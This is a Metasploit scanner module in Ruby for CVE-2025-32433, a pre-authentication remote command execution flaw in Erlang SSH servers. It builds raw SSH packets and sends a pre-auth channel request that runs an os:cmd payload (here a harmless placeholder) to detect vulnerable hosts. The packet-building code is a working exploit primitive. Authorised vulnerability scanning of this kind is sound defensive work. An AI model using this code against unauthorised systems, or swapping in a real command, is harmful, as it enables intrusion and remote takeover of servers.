##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Erlang OTP Pre-Auth RCE Scanner',
        'Description' => %q{
          This module scans for CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH servers
          that allows remote command execution. It identifies vulnerable targets by connecting to the SSH service,
          checking for an Erlang-specific banner, and sending a crafted packets to test the server's response.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Horizon3 Attack Team',
          'Matt Keeley', # PoC
          'Martin Kristiansen', # PoC
          'mekhalleh (RAMELLA Sebastien)' # module author powered by EXA Reunion (https://www.exa.re/)
        ],
        'References' => [
          ['CVE', '2025-32433'],
          ['URL', 'https://x.com/Horizon3Attack/status/1912945580902334793'],
          ['URL', 'https://platformsecurity.com/blog/CVE-2025-32433-poc'],
          ['URL', 'https://github.com/ProDefense/CVE-2025-32433']
        ],
        'DisclosureDate' => '2025-04-16',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  # Builds SSH_MSG_CHANNEL_OPEN for session
  def build_channel_open(channel_id)
    # SSH_MSG_CHANNEL_OPEN (0x5a) + formatted string + channel ID + window size + max packet size
    "\x5a" +
      string_payload('session') +
      [channel_id].pack('N') +
      [0x68000].pack('N') +
      [0x10000].pack('N')
  end

  # Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload
  def build_channel_request(channel_id, command)
    # SSH_MSG_CHANNEL_REQUEST (0x62) + channel ID + 'exec' + want_reply + command
    "\x62" +
      [channel_id].pack('N') +
      string_payload('exec') +
      "\x01" +
      string_payload("os:cmd(\"#{command}\").")
  end

  # Builds a minimal but valid SSH_MSG_KEXINIT packet
  def build_kexinit
    cookie = "\x00" * 16

    "\x14" +
      cookie +
      name_list(
        [
          'curve25519-sha256',
          'ecdh-sha2-nistp256',
          'diffie-hellman-group-exchange-sha256',
          'diffie-hellman-group14-sha256'
        ]
      ) +
      name_list(['rsa-sha2-256', 'rsa-sha2-512']) +
      name_list(['aes128-ctr']) * 2 +
      name_list(['hmac-sha1']) * 2 +
      name_list(['none']) * 2 +
      name_list([]) * 2 +
      "\x00" +
      [0].pack('N')
  end

  def message(msg)
    "ssh://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  # Formats a list of names into an SSH-compatible string (comma-separated)
  def name_list(names)
    string_payload(names.join(','))
  end

  # Pads a packet to match SSH framing
  def pad_packet(payload, block_size)
    min_padding = 4

    payload_length = payload.length
    padding_len = block_size - ((payload_length + 5) % block_size)
    padding_len += block_size if padding_len < min_padding

    [(payload_length + 1 + padding_len)].pack('N') +
      [padding_len].pack('C') +
      payload +
      "\x00" * padding_len
  end

  # Helper to format SSH string (4-byte length + bytes)
  def string_payload(str)
    s_bytes = str.encode('utf-8')
    [s_bytes.length].pack('N') + s_bytes
  end

  def run_host(target_host)
    connect

    sock.put("SSH-2.0-OpenSSH_8.9\r\n")
    banner = sock.get_once(1024, 10)
    unless banner
      print_status(message('No banner received'))
      return Exploit::CheckCode::Unknown
    end

    unless banner.to_s.downcase.include?('erlang')
      print_status(message("Not an Erlang SSH service: #{banner.strip}"))
      return Exploit::CheckCode::Safe
    end
    sleep(0.5)

    print_status(message('Sending SSH_MSG_KEXINIT...'))
    kex_packet = build_kexinit
    sock.put(pad_packet(kex_packet, 8))
    sleep(0.5)

    response = sock.get_once(1024, 5)
    unless response
      print_status(message("Detected Erlang SSH service: #{banner.strip}, but no response to KEXINIT"))
      return Exploit::CheckCode::Detected
    end

    print_status(message('Sending SSH_MSG_CHANNEL_OPEN...'))
    chan_open = build_channel_open(0)
    sock.put(pad_packet(chan_open, 8))
    sleep(0.5)

    print_status(message('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...'))
    chan_req = build_channel_request(0, 'blah')
    sock.put(pad_packet(chan_req, 8))
    sleep(0.5)

    begin
      sock.get_once(1024, 5)
    # when the target is vulnerable you get at this step: rescue Rex::TimeoutError
    rescue EOFError
      # when the target is NOT vulnerable/patched at this step.
      return Exploit::CheckCode::Safe
    end
    sock.close

    note = 'The target is vulnerable to CVE-2025-32433.'
    print_good(message(note))
    report_vuln(
      host: target_host,
      name: name,
      refs: references,
      info: note
    )

    Exploit::CheckCode::Vulnerable
  rescue Rex::ConnectionError
    print_error(message('Failed to connect to the target'))
    Exploit::CheckCode::Unknown
  rescue Rex::TimeoutError
    print_error(message('Connection timed out'))
    Exploit::CheckCode::Unknown
  ensure
    disconnect unless sock.nil?
  end

end
